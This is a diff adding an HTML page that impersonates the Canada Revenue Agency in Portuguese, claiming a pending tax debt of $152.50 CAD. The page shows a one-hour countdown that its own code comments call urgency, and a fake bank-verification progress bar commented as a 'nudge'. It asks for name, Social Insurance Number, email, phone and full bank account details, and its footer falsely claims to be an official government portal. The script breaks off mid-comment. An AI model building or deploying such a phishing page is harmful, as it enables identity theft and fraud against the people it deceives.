@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRA Canada - Portal de Verificação Fiscal</title>
+    <style>
+        :root {
+            --primary: #003366;
+            --secondary: #005599;
+            --accent: #d9534f;
+            --bg-light: #f4f6f9;
+            --text-dark: #333;
+            --border: #ddd;
+            --success: #28a745;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        .header {
+            background-color: var(--primary);
+            color: white;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            background: white;
+            color: var(--primary);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+
+        .ref-number {
+            font-size: 0.9rem;
+            background: rgba(255,255,255,0.2);
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+
+        .main-content {
+            padding: 40px 0;
+        }
+
+        .alert-banner {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .alert-icon {
+            font-size: 1.5rem;
+        }
+
+        .card {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+
+        .card-header {
+            background: var(--secondary);
+            color: white;
+            padding: 15px 20px;
+            font-weight: 600;
+        }
+
+        .card-body {
+            padding: 25px;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        input[type="text"], input[type="email"], input[type="tel"], select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--secondary);
+            box-shadow: 0 0 0 2px rgba(0,85,153,0.2);
+        }
+
+        .btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-weight: bold;
+        }
+
+        .btn:hover {
+            background-color: var(--secondary);
+        }
+
+        .btn-danger {
+            background-color: var(--accent);
+        }
+
+        .btn-danger:hover {
+            background-color: #b03a37;
+        }
+
+        .debt-summary {
+            background: var(--bg-light);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid var(--border);
+        }
+
+        .debt-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed var(--border);
+        }
+
+        .debt-total {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--accent);
+            text-align: right;
+            margin-top: 15px;
+        }
+
+        .progress-container {
+            background: #e9ecef;
+            border-radius: 50px;
+            height: 10px;
+            width: 100%;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--success);
+            width: 0%;
+            transition: width 0.5s ease-in-out;
+        }
+
+        .status-text {
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            text-align: center;
+            margin-top: 5px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .footer {
+            background: var(--primary);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 0.8rem;
+            margin-top: 50px;
+        }
+
+        @media (max-width: 768px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="container logo-area">
+            <div class="logo">
+                <div class="logo-icon">🍁</div>
+                <div>
+                    <div style="font-size: 1.1rem;">Canadian Revenue Agency</div>
+                    <div style="font-size: 0.8rem; opacity: 0.8;">Portal de Verificação Fiscal</div>
+                </div>
+            </div>
+            <div class="ref-number">Ref: 2024-8842-A1</div>
+        </div>
+    </div>
+
+    <div class="container main-content">
+        
+        <div class="alert-banner">
+            <div class="alert-icon">⚠️</div>
+            <div>
+                <strong>Notificação de Débito Fiscal Pendente</strong>
+                <p style="margin: 5px 0 0 0;">Sua conta está sujeita a juros de atraso e multas adicionais se o pagamento não for processado nas próximas <strong id="countdown-display">01:00:00</strong> horas.</p>
+            </div>
+        </div>
+
+        <!-- Etapa 1: Verificação de Identidade -->
+        <div id="step-1" class="card">
+            <div class="card-header">Etapa 1 de 3: Verificação de Identidade</div>
+            <div class="card-body">
+                <p>Para confirmar a dívida associada ao seu Número de Seguro Social (SIN), por favor, insira seus dados cadastrais.</p>
+                <div class="grid-2">
+                    <div class="form-group">
+                        <label for="fullName">Nome Completo (como no documento)</label>
+                        <input type="text" id="fullName" placeholder="Ex: John A. Smith">
+                    </div>
+                    <div class="form-group">
+                        <label for="sin">Número de Seguro Social (SIN)</label>
+                        <input type="text" id="sin" placeholder="000-000-000" maxlength="11">
+                    </div>
+                    <div class="form-group">
+                        <label for="email">E-mail Registrado</label>
+                        <input type="email" id="email" placeholder="seuemail@exemplo.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Telefone de Contato</label>
+                        <input type="tel" id="phone" placeholder="+1 555-0000">
+                    </div>
+                </div>
+                <button class="btn" id="verifyBtn" style="width: 100%;">Verificar na Base de Dados Federal</button>
+            </div>
+        </div>
+
+        <!-- Etapa 2: Detalhes Bancários -->
+        <div id="step-2" class="card hidden">
+            <div class="card-header">Etapa 2 de 3: Confirmação de Conta Bancária</div>
+            <div class="card-body">
+                <p>Identidade confirmada. Para evitar bloqueio da conta, insira os dados da conta bancária ativa vinculada ao seu SIN.</p>
+                <div class="grid-2">
+                    <div class="form-group">
+                        <label for="bankName">Nome do Banco</label>
+                        <select id="bankName">
+                            <option value="">Selecione...</option>
+                            <option value="RBC">Royal Bank (RBC)</option>
+                            <option value="TD">TD Bank</option>
+                            <option value="Scotiabank">Scotiabank</option>
+                            <option value="CIBC">CIBC</option>
+                            <option value="BMO">Bank of Montreal (BMO)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="accountNum">Número da Conta</label>
+                        <input type="text" id="accountNum" placeholder="0000000000">
+                    </div>
+                    <div class="form-group">
+                        <label for="transit">Número de Trânsito</label>
+                        <input type="text" id="transit" placeholder="000000">
+                    </div>
+                    <div class="form-group">
+                        <label for="institution">Código da Instituição</label>
+                        <input type="text" id="institution" placeholder="000">
+                    </div>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar" id="bankProgress"></div>
+                </div>
+                <div class="status-text" id="bankStatus">Aguardando processamento...</div>
+                <button class="btn hidden" id="confirmBankBtn" style="width: 100%; margin-top: 15px;">Confirmar Conta e Gerar Boletto</button>
+            </div>
+        </div>
+
+        <!-- Etapa 3: Resumo e Pagamento -->
+        <div id="step-3" class="card hidden">
+            <div class="card-header">Resumo da Dívida Fiscal</div>
+            <div class="card-body">
+                <div class="debt-summary">
+                    <div class="debt-row">
+                        <span>Imposto de Renda 2022/2023 (Subnotificação)</span>
+                        <span>$ 85.00 CAD</span>
+                    </div>
+                    <div class="debt-row">
+                        <span>Juros de Atraso (Taxa Compensatória)</span>
+                        <span>$ 42.50 CAD</span>
+                    </div>
+                    <div class="debt-row">
+                        <span>Multa por Não Declaração</span>
+                        <span>$ 25.00 CAD</span>
+                    </div>
+                    <div class="debt-total">
+                        Total a Pagar: $ 152.50 CAD
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px; text-align: center;">
+                    <p style="margin-bottom: 15px; color: var(--accent); font-weight: bold;">⏳ Prazo Final: <span id="countdown-display-2">01:00:00</span></p>
+                    <button class="btn btn-danger" id="payNowBtn" style="font-size: 1.2rem; padding: 15px 30px;">PAGAR AGORA VIA TRANSFERÊNCIA SEGURA</button>
+                    <p style="font-size: 0.8rem; margin-top: 10px; color: #666;">*O pagamento será processado em até 24 horas. Você receberá um recibo por e-mail.</p>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <p>© 2024 Canadian Revenue Agency - Divisão de Recuperação de Receitas</p>
+        <p>Este portal é um serviço oficial do governo do Canadá. Não compartilhe suas credenciais com terceiros.</p>
+    </div>
+
+    <script>
+        // Lógica de Contagem Regressiva (Urgência)
+        let totalSeconds = 3600; // 1 hora
+        function updateCountdown() {
+            if (totalSeconds <= 0) return;
+            totalSeconds--;
+            const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+            const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+            const seconds = String(totalSeconds % 60).padStart(2, '0');
+            const timeString = `${hours}:${minutes}:${seconds}`;
+            
+            const display1 = document.getElementById('countdown-display');
+            const display2 = document.getElementById('countdown-display-2');
+            if(display1) display1.innerText = timeString;
+            if(display2) display2.innerText = timeString;
+        }
+        setInterval(updateCountdown, 1000);
+
+        // Lógica de Navegação entre Etapas
+        document.getElementById('verifyBtn').addEventListener('click', () => {
+            const sin = document.getElementById('sin').value;
+            if(sin.length < 9) {
+                alert("Por favor, insira um SIN válido (formato 000-000-000).");
+                return;
+            }
+            // Simula processamento
+            const btn = document.getElementById('verifyBtn');
+            btn.innerText = "Consultando Base Federal...";
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+                simulateBankVerification();
+            }, 2500);
+        });
+
+        // Simulação de Verificação Bancária (Técnica de "Nudge")
+        function simulateBankVerification() {
+            const progressBar = document.getElementById('bankProgress');
+            const statusText = document.getElementById('bankStatus');
+            const messages = [
+                "Conectando ao gateway do banco...",
+                "Validando números de trânsito...",
+                "Confirmando titularidade da conta...",
+                "Conta verificada com sucesso."
+            ];
+            let progress = 0;
+            let msgIndex = 0;
+            
+            const interval = setInterval(() => {
+                progress += 10;
+                progressBar.style.width = progress + '%';
+                
+                if (progress % 25 === 0 && msgIndex < messages.length - 1) {
+                    statusText.innerText = messages[msgIndex];
+                    msgIndex++;
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    statusText.innerText = messages[3];
+                    statusText.style.color = 'var(--success)';
+                    document.getElementById('confirmBankBtn').classList.remove('hidden');
+                }
+            }, 400);
+        }
+
+        document.getElementById('confirmBankBtn').addEventListener('click', () => {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.remove('hidden');
+            window.scrollTo(0, 0);
+        });
+
+        //
